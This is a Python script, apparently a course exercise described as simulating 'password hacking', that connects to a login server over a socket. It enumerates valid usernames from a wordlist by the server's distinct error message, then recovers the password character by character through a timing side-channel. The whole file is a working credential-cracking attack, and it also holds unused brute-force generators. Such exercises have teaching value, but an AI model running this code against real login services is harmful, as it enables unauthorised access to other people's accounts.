import socket
import json
import argparse
import string
import time
from itertools import product

def password_generator():
    full = string.ascii_letters + string.digits
    length = 1
    while True:
        for combo in product(full, repeat=length):
            password = ''.join(combo)
            yield password
        length += 1

def case_password_generator(password):
    case_sensitive_letters = [(c.upper(), c.lower()) if c.isalpha() else (c,) for c in password]
    for combo in product(*case_sensitive_letters):
        yield ''.join(combo)

parser = argparse.ArgumentParser(description="This program will simulate password hacking.")
parser.add_argument("ip", help="IP address to connect to")
parser.add_argument("port", type=int, help="Port number to connect to")
parser.add_argument("logins_file", help="Path to the file containing possible logins")
args = parser.parse_args()

client_socket = socket.socket()
hostname = args.ip
port = int(args.port)
client_socket.connect((hostname, port))

password_list = []
with open(args.logins_file, 'r') as file:
    for line in file:
        password_list.append(line.strip())

login = ""
for p in password_list:
    data = {"login": p, "password": "0"}
    client_socket.send(json.dumps(data).encode())
    response = json.loads(client_socket.recv(1024).decode())
    if response["result"] == "Wrong password!":
        login = p
        break

password = ""
chars = string.ascii_letters + string.digits
while True:
    found_char = False
    for c in chars:
        guess = password + c
        data = {"login": login, "password": guess}
        start = time.time()
        client_socket.send(json.dumps(data).encode())
        response = json.loads(client_socket.recv(1024).decode())
        end = time.time()
        if response["result"] == "Connection success!":
            password += c
            print(json.dumps({"login": login, "password": password}))
            client_socket.close()
            exit()
        if (end - start) > 0.1:
            password += c
            found_char = True
            break
    if not found_char:
        break




